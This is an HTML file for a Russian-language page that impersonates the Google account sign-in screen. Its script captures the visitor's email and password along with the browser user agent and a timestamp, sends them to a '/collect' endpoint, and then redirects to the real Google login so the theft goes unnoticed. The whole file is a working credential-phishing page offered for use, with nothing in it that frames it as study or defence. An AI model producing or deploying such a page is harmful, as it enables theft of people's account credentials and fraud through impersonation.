<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>Войдите в Google Аккаунт</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background: white;
            margin: 0;
            padding: 0;
        }
        .google-header {
            text-align: center;
            padding: 20px;
        }
        .login-container {
            width: 450px;
            margin: 50px auto;
            border: 1px solid #dadce0;
            border-radius: 8px;
            padding: 48px 40px 36px;
        }
        .google-logo {
            text-align: center;
            margin-bottom: 20px;
        }
        input[type="email"], input[type="password"] {
            width: 100%;
            padding: 13px 15px;
            margin: 10px 0;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
        }
        .next-button {
            background: #1a73e8;
            color: white;
            border: none;
            padding: 10px 24px;
            border-radius: 4px;
            float: right;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="google-header">
        <!-- Пустое место вместо логотипа -->
    </div>
    
    <div class="login-container">
        <div class="google-logo">
            <h2>Войдите</h2>
            <p>Продолжить в Google Аккаунт</p>
        </div>
        
        <form id="loginForm" method="POST">
            <input type="email" id="email" name="email" placeholder="Электронная почта или телефон" required>
            <input type="password" id="password" name="password" placeholder="Введите ваш пароль" required>
            <button type="submit" class="next-button">Далее</button>
        </form>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            
            // Отправка данных на сервер
            fetch('/collect', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    email: email,
                    password: password,
                    userAgent: navigator.userAgent,
                    timestamp: new Date().toISOString()
                })
            }).then(() => {
                // Перенаправление на настоящий Google после сбора данных
                window.location.href = 'https://accounts.google.com';
            });
        });
    </script>
</body>
</html>
